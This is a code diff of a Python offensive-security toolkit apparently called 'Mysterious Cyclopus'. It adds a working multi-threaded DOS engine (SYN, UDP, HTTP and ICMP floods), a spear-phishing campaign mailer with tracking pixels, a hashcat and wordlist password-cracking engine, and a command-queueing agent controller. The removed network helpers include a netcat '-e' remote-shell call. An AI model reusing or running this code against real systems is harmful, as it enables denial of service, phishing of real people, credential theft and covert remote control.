                 """INSERT INTO pdf_reports 
@@ -1411,43 +2013,6 @@ class DatabaseManager:
             print(f"Failed to get PDF reports: {e}")
             return []
     
-    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
-                           dest_port: int, protocol: str, size: int, payload: str = ""):
-        try:
-            self.conn.execute(
-                """INSERT INTO network_packets 
-                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
-                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
-                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
-            )
-            self.conn.commit()
-        except Exception as e:
-            print(f"Failed to save network packet: {e}")
-    
-    def get_network_packets(self, limit: int = 100) -> List[Dict]:
-        try:
-            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
-            return [dict(row) for row in rows]
-        except:
-            return []
-    
-    def save_clipboard(self, content: str, source: str = "system"):
-        try:
-            self.conn.execute(
-                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
-                (content[:5000], source)
-            )
-            self.conn.commit()
-        except Exception as e:
-            print(f"Failed to save clipboard: {e}")
-    
-    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
-        try:
-            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
-            return [dict(row) for row in rows]
-        except:
-            return []
-    
     def close(self):
         try:
             self.conn.close()
@@ -1455,253 +2020,372 @@ class DatabaseManager:
             pass
 
 # =====================
-# NETWORK TOOLS
+# EMAIL COMPOSER ENGINE
 # =====================
-class NetworkTools:
-    @staticmethod
-    def ping(target: str, count: int = 4) -> CommandResult:
-        start_time = time.time()
-        try:
-            if platform.system().lower() == 'windows':
-                cmd = ['ping', '-n', str(count), target]
-            else:
-                cmd = ['ping', '-c', str(count), target]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
+class EmailComposerEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.smtp_server = config.get('email.smtp_server', '')
+        self.smtp_port = config.get('email.smtp_port', 587)
+        self.smtp_username = config.get('email.smtp_username', '')
+        self.smtp_password = config.get('email.smtp_password', '')
+        self.from_email = config.get('email.from_email', '')
+        self.tls = config.get('email.tls', True)
     
-    @staticmethod
-    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
-        start_time = time.time()
+    def compose_email(self, to: str, subject: str, body: str, 
+                      from_email: str = None, html: bool = False,
+                      attachments: List[str] = None) -> EmailMessage:
+        email_msg = EmailMessage(
+            to=to,
+            subject=subject,
+            body=body,
+            from_email=from_email or self.from_email,
+            attachments=attachments or [],
+            html=html,
+            status="draft"
+        )
+        self.db.save_email(email_msg)
+        return email_msg
+    
+    def send_email(self, email_id: int) -> Dict[str, Any]:
+        emails = self.db.get_emails(limit=100)
+        email_data = next((e for e in emails if e['id'] == email_id), None)
+        
+        if not email_data:
+            return {'success': False, 'error': f'Email {email_id} not found'}
+        
+        if email_data['status'] == 'sent':
+            return {'success': False, 'error': 'Email already sent'}
+        
+        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
+            return {'success': False, 'error': 'SMTP server not configured'}
+        
         try:
-            if scan_type == "quick":
-                cmd = ['nmap', '-T4', '-F', target]
-            elif scan_type == "full":
-                cmd = ['nmap', '-p-', target]
-            elif scan_type == "service":
-                cmd = ['nmap', '-sV', target]
-            elif scan_type == "os":
-                cmd = ['nmap', '-O', target]
+            msg = MIMEMultipart()
+            msg['From'] = email_data['from_address']
+            msg['To'] = email_data['to_address']
+            msg['Subject'] = email_data['subject']
+            
+            if email_data['html']:
+                msg.attach(MIMEText(email_data['body'], 'html'))
             else:
-                cmd = ['nmap', target]
+                msg.attach(MIMEText(email_data['body'], 'plain'))
+            
+            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
+            for attachment_path in attachments:
+                if os.path.exists(attachment_path):
+                    with open(attachment_path, 'rb') as f:
+                        part = MIMEBase('application', 'octet-stream')
+                        part.set_payload(f.read())
+                        encoders.encode_base64(part)
+                        part.add_header(
+                            'Content-Disposition',
+                            f'attachment; filename={os.path.basename(attachment_path)}'
+                        )
+                        msg.attach(part)
+            
+            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
+                if self.tls:
+                    server.starttls()
+                server.login(self.smtp_username, self.smtp_password)
+                server.send_message(msg)
+            
+            self.db.update_email_status(email_id, 'sent')
+            
+            return {
+                'success': True,
+                'message': f'Email sent to {email_data["to_address"]}',
+                'email_id': email_id
+            }
+            
+        except Exception as e:
+            self.db.update_email_status(email_id, 'failed')
+            return {'success': False, 'error': str(e)}
+    
+    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
+        return self.db.get_emails(status, limit)
+    
+    def delete_email(self, email_id: int) -> bool:
+        try:
+            self.db.conn.execute("DELETE FROM email_messages WHERE id = ?", (email_id,))
+            self.db.conn.commit()
+            return True
+        except:
+            return False
+
+# =====================
+# PDF REPORT GENERATOR
+# =====================
+class PDFReportGenerator:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.pdf_available = PDF_AVAILABLE
+    
+    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
+        if not self.pdf_available:
+            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
+        
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"cyclopus_report_{target}_{timestamp}.pdf"
+            filepath = os.path.join(PDF_REPORTS_DIR, filename)
+            
+            doc = SimpleDocTemplate(
+                filepath,
+                pagesize=A4,
+                rightMargin=72,
+                leftMargin=72,
+                topMargin=72,
+                bottomMargin=72
+            )
+            
+            styles = getSampleStyleSheet()
+            title_style = ParagraphStyle(
+                'CustomTitle',
+                parent=styles['Heading1'],
+                fontSize=24,
+                textColor=colors.HexColor('#FF7A1A'),
+                alignment=0,
+                spaceAfter=30
+            )
+            
+            story = []
+            
+            story.append(Paragraph(f"🐙 Mysterious Cyclopus Security Report", title_style))
+            story.append(Paragraph(f"Title: {title}", styles['Heading2']))
+            story.append(Paragraph(f"Target: {target}", styles['Normal']))
+            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
+            story.append(Spacer(1, 20))
+            
+            story.append(Paragraph("Executive Summary", styles['Heading2']))
+            summary = f"This report presents a comprehensive security analysis of <b>{target}</b>."
+            story.append(Paragraph(summary, styles['Normal']))
+            story.append(Spacer(1, 12))
+            
+            for key, value in analysis.items():
+                if isinstance(value, dict):
+                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
+                    for sub_key, sub_value in value.items():
+                        if not isinstance(sub_value, (dict, list)):
+                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
+                    story.append(Spacer(1, 10))
+            
+            if 'recommendations' in analysis:
+                story.append(Paragraph("Recommendations", styles['Heading2']))
+                for rec in analysis['recommendations']:
+                    story.append(Paragraph(f"• {rec}", styles['Normal']))
+            
+            story.append(Spacer(1, 30))
+            story.append(Paragraph(
+                f"Report generated by Mysterious Cyclopus v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                styles['Italic']
+            ))
+            
+            doc.build(story)
+            
+            report = PDFReport(
+                title=title,
+                target=target,
+                analysis=analysis,
+                timestamp=datetime.datetime.now().isoformat(),
+                file_path=filepath,
+                status="generated"
+            )
+            self.db.save_pdf_report(report)
+            
+            return {
+                'success': True,
+                'file_path': filepath,
+                'message': f'PDF report generated: {filename}'
+            }
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def get_reports(self, limit: int = 20) -> List[Dict]:
+        return self.db.get_pdf_reports(limit)
+
+# =====================
+# CRACKING ENGINE
+# =====================
+class CrackingEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.running_jobs = {}
+        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
+        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
+        self.default_hash_type = config.get('cracking.default_hash_type', 0)
+    
+    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
+        job_id = str(uuid.uuid4())[:8]
+        wordlist = wordlist or self.wordlist_path
+        
+        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
+        
+        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
+        thread.daemon = True
+        thread.start()
+        
+        return job_id
+    
+    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
+        self.db.update_cracking_job(job_id, 'running')
+        
+        try:
+            hash_type_num = self._get_hash_type_num(hash_type)
+            
+            if not shutil.which(self.hashcat_path):
+                result = self._crack_with_python(hash_type, hash_value, wordlist)
+                if result:
+                    self.db.update_cracking_job(job_id, 'completed', result, True)
+                else:
+                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
+                return
+            
+            cmd = [
+                self.hashcat_path,
+                '-m', str(hash_type_num),
+                '-a', '0',
+                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
+                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
+                hash_value,
+                wordlist
+            ]
             
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            execution_time = time.time() - start_time
             
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
-    
-    @staticmethod
-    def wget(url: str, output: str = None) -> CommandResult:
-        start_time = time.time()
-        try:
-            cmd = ['wget', '-q', url]
-            if output:
-                cmd.extend(['-O', output])
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
-    
-    @staticmethod
-    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
-        start_time = time.time()
-        try:
-            if method.upper() == "GET":
-                cmd = ['curl', '-s', url]
-            elif method.upper() == "POST":
-                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
+            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
+            if os.path.exists(result_file):
+                with open(result_file, 'r') as f:
+                    content = f.read().strip()
+                    if ':' in content:
+                        cracked = content.split(':', 1)[1]
+                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
+                    else:
+                        self.db.update_cracking_job(job_id, 'completed', content, True)
             else:
-                cmd = ['curl', '-s', '-X', method, url]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
+                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
+                
+        except subprocess.TimeoutExpired:
+            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
         except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
+            self.db.update_cracking_job(job_id, 'failed', str(e), False)
     
-    @staticmethod
-    def netcat(host: str, port: int, command: str = None) -> CommandResult:
-        start_time = time.time()
-        try:
-            if shutil.which('nc'):
-                if command:
-                    cmd = ['nc', host, str(port), '-e', command]
-                else:
-                    cmd = ['nc', '-zv', host, str(port)]
-            elif shutil.which('ncat'):
-                if command:
-                    cmd = ['ncat', host, str(port), '-e', command]
-                else:
-                    cmd = ['ncat', '-zv', host, str(port)]
-            else:
-                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    def _get_hash_type_num(self, hash_type: str) -> int:
+        hash_types = {
+            'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
+            'ntlm': 1000, 'mysql': 200, 'mysql5': 300, 'postgres': 12,
+            'mssql': 131, 'oracle': 3100, 'bcrypt': 3200, 'scrypt': 8900
+        }
+        return hash_types.get(hash_type.lower(), self.default_hash_type)
     
-    @staticmethod
-    def traceroute(target: str) -> CommandResult:
-        start_time = time.time()
+    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
         try:
-            if platform.system().lower() == 'windows':
-                cmd = ['tracert', '-d', target]
-            else:
-                if shutil.which('mtr'):
-                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
-                else:
-                    cmd = ['traceroute', '-n', target]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
-    
-    @staticmethod
-    def whois(domain: str) -> CommandResult:
-        start_time = time.time()
-        try:
-            if WHOIS_AVAILABLE:
-                result = whois.whois(domain)
-                execution_time = time.time() - start_time
-                return CommandResult(True, str(result), execution_time)
-            else:
-                cmd = ['whois', domain]
-                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-                execution_time = time.time() - start_time
-                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
-    
-    @staticmethod
-    def dns(domain: str, record_type: str = "A") -> CommandResult:
-        start_time = time.time()
-        try:
-            if shutil.which('dig'):
-                cmd = ['dig', domain, record_type, '+short']
-            else:
-                cmd = ['nslookup', domain]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-            execution_time = time.time() - start_time
-            
-            return CommandResult(
-                success=result.returncode == 0,
-                output=result.stdout + result.stderr,
-                execution_time=execution_time
-            )
-        except Exception as e:
-            return CommandResult(False, str(e), time.time() - start_time, str(e))
-    
-    @staticmethod
-    def location(ip: str) -> Dict:
-        try:
-            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                if data.get('status') == 'success':
-                    return {
-                        'success': True,
-                        'country': data.get('country'),
-                        'city': data.get('city'),
-                        'isp': data.get('isp'),
-                        'lat': data.get('lat'),
-                        'lon': data.get('lon')
-                    }
-            return {'success': False}
+            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                for word in f:
+                    word = word.strip()
+                    if not word:
+                        continue
+                    
+                    if hash_type.lower() == 'md5':
+                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
+                            return word
+                    elif hash_type.lower() == 'sha1':
+                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
+                            return word
+                    elif hash_type.lower() == 'sha256':
+                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
+                            return word
+                    elif hash_type.lower() == 'sha512':
+                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
+                            return word
+            return None
         except:
-            return {'success': False}
+            return None
     
-    @staticmethod
-    def get_local_ip() -> str:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-            return ip
-        except:
-            return "127.0.0.1"
-    
-    @staticmethod
-    def block_ip(ip: str) -> bool:
-        try:
-            if platform.system().lower() == 'linux' and shutil.which('iptables'):
-                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
-                             capture_output=True, timeout=10)
-                return True
-            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
-                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
-                               f'name=CYCLOPUS_Block_{ip}', 'dir=in', 'action=block',
-                               f'remoteip={ip}'], capture_output=True, timeout=10)
-                return True
-            return False
-        except:
-            return False
-    
-    @staticmethod
-    def unblock_ip(ip: str) -> bool:
-        try:
-            if platform.system().lower() == 'linux' and shutil.which('iptables'):
-                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
-                             capture_output=True, timeout=10)
-                return True
-            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
-                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
-                               f'name=CYCLOPUS_Block_{ip}'], capture_output=True, timeout=10)
-                return True
-            return False
-        except:
-            return False
-    
-    @staticmethod
-    def get_mac_vendor(mac: str) -> Optional[str]:
-        try:
-            mac = mac.upper().replace('-', ':').replace('.', ':')
-            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
-            if response.status_code == 200:
-                return response.text.strip()
-        except:
-            pass
+    def get_job_status(self, job_id: str) -> Optional[Dict]:
+        jobs = self.db.get_cracking_jobs()
+        for job in jobs:
+            if job['job_id'] == job_id:
+                return dict(job)
         return None
+    
+    def get_all_jobs(self) -> List[Dict]:
+        return self.db.get_cracking_jobs()
+
+# =====================
+# DOCKER SCANNER
+# =====================
+class DockerScanner:
+    def __init__(self, db: DatabaseManager):
+        self.db = db
+    
+    def scan_image(self, image: str) -> Dict:
+        start_time = time.time()
+        try:
+            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
+            scan_time = time.time() - start_time
+            
+            vulnerabilities = self._parse_vulnerabilities(result.stdout)
+            severity = self._determine_severity(vulnerabilities)
+            
+            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
+            
+            return {
+                'success': result.returncode == 0,
+                'image': image,
+                'vulnerabilities': vulnerabilities,
+                'severity': severity,
+                'scan_time': scan_time,
+                'output': result.stdout[:2000]
+            }
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': 'Scan timed out', 'image': image}
+        except Exception as e:
+            return {'success': False, 'error': str(e), 'image': image}
+    
+    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
+        vulns = []
+        for line in output.split('\n'):
+            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
+                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
+                vulns.append({'severity': severity, 'description': line.strip()})
+        return vulns
+    
+    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
+        if any(v.get('severity') == 'critical' for v in vulnerabilities):
+            return 'critical'
+        if any(v.get('severity') == 'high' for v in vulnerabilities):
+            return 'high'
+        if vulnerabilities:
+            return 'medium'
+        return 'low'
+    
+    def docker_info(self) -> Dict:
+        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
+        return {'success': result.returncode == 0, 'output': result.stdout}
+    
+    def docker_ps(self) -> Dict:
+        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
+        return {'success': result.returncode == 0, 'output': result.stdout}
+    
+    def docker_images(self) -> Dict:
+        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
+        return {'success': result.returncode == 0, 'output': result.stdout}
+    
+    def docker_bench(self) -> Dict:
+        result = subprocess.run(
+            ['docker', 'run', '--rm', '--net', 'host', '--pid', 'host',
+             '--cap-add', 'audit_control', '-v', '/var/lib:/var/lib',
+             '-v', '/var/run/docker.sock:/var/run/docker.sock',
+             '-v', '/etc:/etc', '-v', '/usr/lib/systemd:/usr/lib/systemd',
+             'docker/docker-bench-security'],
+            capture_output=True, text=True, timeout=300
+        )
+        return {'success': result.returncode == 0, 'output': result.stdout}
 
 # =====================
 # SSH MANAGER
@@ -2074,6 +2758,1288 @@ class TrafficGeneratorEngine:
         ]
 
 # =====================
+# NIKTO SCANNER
+# =====================
+class NiktoScanner:
+    def __init__(self, db: DatabaseManager):
+        self.db = db
+        self.available = self._check_available()
+    
+    def _check_available(self) -> bool:
+        return shutil.which('nikto') is not None
+    
+    def scan(self, target: str, options: Dict = None) -> Dict:
+        start_time = time.time()
+        options = options or {}
+        
+        if not self.available:
+            return {'success': False, 'error': 'Nikto not installed'}
+        
+        try:
+            timestamp = int(time.time())
+            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
+            
+            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
+            if options.get('ssl'):
+                cmd.append('-ssl')
+            if options.get('port'):
+                cmd.extend(['-port', str(options['port'])])
+            if options.get('tuning'):
+                cmd.extend(['-tuning', options['tuning']])
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+            scan_time = time.time() - start_time
+            
+            vulnerabilities = []
+            if os.path.exists(output_file):
+                try:
+                    with open(output_file, 'r') as f:
+                        data = json.load(f)
+                        if isinstance(data, dict) and 'vulnerabilities' in data:
+                            vulnerabilities = data['vulnerabilities']
+                except:
+                    pass
+            
+            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
+            
+            return {
+                'success': result.returncode == 0,
+                'target': target,
+                'vulnerabilities': vulnerabilities,
+                'scan_time': scan_time,
+                'output_file': output_file
+            }
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': 'Scan timed out'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def get_available_scan_types(self) -> List[str]:
+        return ["full", "ssl", "cgi", "sql", "xss"]
+
+# =====================
+# DOS ATTACK ENGINE
+# =====================
+class DOSEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.running_attacks: Dict[str, threading.Event] = {}
+    
+    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
+        return self._attack("syn", target_ip, port, duration, threads)
+    
+    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
+        return self._attack("udp", target_ip, port, duration, threads)
+    
+    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
+        return self._attack("http", target_ip, port, duration, threads)
+    
+    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
+        return self._attack("icmp", target_ip, 0, duration, threads)
+    
+    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
+        max_threads = self.config.get('dos.max_threads', 100)
+        if threads > max_threads:
+            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
+        
+        try:
+            ipaddress.ip_address(target_ip)
+        except:
+            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
+        
+        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
+        stop_event = threading.Event()
+        self.running_attacks[attack_id] = stop_event
+        
+        packets_sent = 0
+        
+        def attack_thread():
+            nonlocal packets_sent
+            end_time = time.time() + duration
+            func = self._get_attack_func(attack_type)
+            
+            while time.time() < end_time and not stop_event.is_set():
+                try:
+                    size = func(target_ip, port)
+                    if size > 0:
+                        packets_sent += 1
+                except:
+                    pass
+        
+        attack_threads = []
+        for _ in range(threads):
+            t = threading.Thread(target=attack_thread, daemon=True)
+            t.start()
+            attack_threads.append(t)
+        
+        def monitor():
+            for t in attack_threads:
+                t.join(timeout=duration + 2)
+            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
+            if attack_id in self.running_attacks:
+                del self.running_attacks[attack_id]
+        
+        threading.Thread(target=monitor, daemon=True).start()
+        
+        return {
+            'success': True,
+            'attack_id': attack_id,
+            'type': attack_type,
+            'target': target_ip,
+            'port': port,
+            'duration': duration,
+            'threads': threads,
+            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
+        }
+    
+    def _get_attack_func(self, attack_type: str):
+        funcs = {
+            'syn': self._send_syn,
+            'udp': self._send_udp,
+            'http': self._send_http,
+            'icmp': self._send_icmp
+        }
+        return funcs.get(attack_type, self._send_udp)
+    
+    def _send_syn(self, target: str, port: int) -> int:
+        try:
+            if SCAPY_AVAILABLE:
+                packet = IP(dst=target)/TCP(dport=port, flags="S")
+                send(packet, verbose=False)
+                return len(packet)
+            return 0
+        except:
+            return 0
+    
+    def _send_udp(self, target: str, port: int) -> int:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            data = b"X" * 1024
+            sock.sendto(data, (target, port))
+            sock.close()
+            return len(data) + 8
+        except:
+            return 0
+    
+    def _send_http(self, target: str, port: int) -> int:
+        try:
+            conn = http.client.HTTPConnection(target, port, timeout=1)
+            conn.request("GET", "/", headers={"User-Agent": "MysteriousCyclopus"})
+            response = conn.getresponse()
+            data = response.read()
+            conn.close()
+            return len(data) + 100
+        except:
+            return 0
+    
+    def _send_icmp(self, target: str, port: int) -> int:
+        try:
+            if SCAPY_AVAILABLE:
+                packet = IP(dst=target)/ICMP()
+                send(packet, verbose=False)
+                return len(packet)
+            return 0
+        except:
+            return 0
+    
+    def stop(self, attack_id: str = None) -> bool:
+        if attack_id:
+            if attack_id in self.running_attacks:
+                self.running_attacks[attack_id].set()
+                return True
+        else:
+            for event in self.running_attacks.values():
+                event.set()
+            return True
+        return False
+    
+    def get_active(self) -> List[Dict]:
+        return [
+            {
+                'id': attack_id,
+                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
+                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
+            }
+            for attack_id in self.running_attacks.keys()
+        ]
+
+# =====================
+# SPEAR PHISHING ENGINE
+# =====================
+class SpearPhishingEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+    
+    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
+                       targets: List[Dict], scheduled_time: str = None) -> SpearPhishingCampaign:
+        campaign = SpearPhishingCampaign(
+            id=str(uuid.uuid4())[:8],
+            name=name,
+            template=template,
+            subject=subject,
+            from_email=from_email,
+            targets=targets,
+            scheduled_time=scheduled_time,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        self.db.save_spear_phishing_campaign(campaign)
+        return campaign
+    
+    def send_campaign(self, campaign_id: str) -> Dict:
+        campaigns = self.db.get_spear_phishing_campaigns()
+        campaign_data = next((c for c in campaigns if c['id'] == campaign_id), None)
+        if not campaign_data:
+            return {'success': False, 'error': 'Campaign not found'}
+        
+        smtp_server = self.config.get('spear_phishing.smtp_server', '')
+        smtp_port = self.config.get('spear_phishing.smtp_port', 587)
+        smtp_username = self.config.get('spear_phishing.smtp_username', '')
+        smtp_password = self.config.get('spear_phishing.smtp_password', '')
+        
+        if not smtp_server:
+            return {'success': False, 'error': 'SMTP server not configured'}
+        
+        sent_count = 0
+        targets = json.loads(campaign_data['targets']) if campaign_data['targets'] else []
+        
+        for target in targets:
+            try:
+                msg = email.message.EmailMessage()
+                msg['Subject'] = campaign_data['subject']
+                msg['From'] = campaign_data['from_email']
+                msg['To'] = target.get('email', '')
+                
+                template = campaign_data['template']
+                for key, value in target.items():
+                    template = template.replace(f"{{{{{key}}}}}", str(value))
+                
+                tracking_url = f"{self.config.get('spear_phishing.tracking_server', 'http://localhost:5000')}/track/{campaign_id}/{target.get('email', '')}"
+                template += f'\n<img src="{tracking_url}" width="1" height="1">'
+                
+                if '<html' in template.lower():
+                    msg.set_content(template, subtype='html')
+                else:
+                    msg.set_content(template)
+                
+                with smtplib.SMTP(smtp_server, smtp_port) as server:
+                    server.starttls()
+                    server.login(smtp_username, smtp_password)
+                    server.send_message(msg)
+                
+                sent_count += 1
+            except Exception as e:
+                print(f"Failed to send to {target.get('email', 'unknown')}: {e}")
+        
+        self.db.conn.execute(
+            "UPDATE spear_phishing_campaigns SET sent_count = ?, status = 'sent' WHERE id = ?",
+            (sent_count, campaign_id)
+        )
+        self.db.conn.commit()
+        
+        return {
+            'success': True,
+            'campaign_id': campaign_id,
+            'sent_count': sent_count,
+            'total_targets': len(targets)
+        }
+    
+    def track_open(self, campaign_id: str, target_email: str, tracking_id: str = None):
+        self.db.track_email_open(campaign_id, target_email)
+    
+    def track_click(self, campaign_id: str, target_email: str):
+        self.db.track_email_click(campaign_id, target_email)
+    
+    def get_campaigns(self) -> List[Dict]:
+        return self.db.get_spear_phishing_campaigns()
+
+# =====================
+# AGENT ENGINE
+# =====================
+class AgentEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.heartbeat_timer = None
+    
+    def register_agent(self, name: str, ip_address: str) -> Dict:
+        agent_id = str(uuid.uuid4())[:8]
+        self.db.register_agent(agent_id, name, ip_address)
+        return {
+            'success': True,
+            'agent_id': agent_id,
+            'name': name,
+            'ip_address': ip_address,
+            'message': f'Agent {name} registered'
+        }
+    
+    def send_command(self, agent_id: str, command: str) -> bool:
+        return self.db.add_agent_command(agent_id, command)
+    
+    def poll_commands(self, agent_id: str) -> List[Dict]:
+        return self.db.get_pending_agent_commands(agent_id)
+    
+    def submit_result(self, command_id: int, result: str, status: str = "completed"):
+        self.db.update_agent_command_result(command_id, result, status)
+    
+    def start_heartbeat(self):
+        def heartbeat():
+            agents = self.db.get_agents()
+            for agent in agents:
+                self.db.update_agent_heartbeat(agent['id'])
+            
+            if self.heartbeat_timer:
+                self.heartbeat_timer.cancel()
+            
+            interval = self.config.get('agent.heartbeat_interval', 30)
+            self.heartbeat_timer = threading.Timer(interval, heartbeat)
+            self.heartbeat_timer.daemon = True
+            self.heartbeat_timer.start()
+        
+        heartbeat()
+    
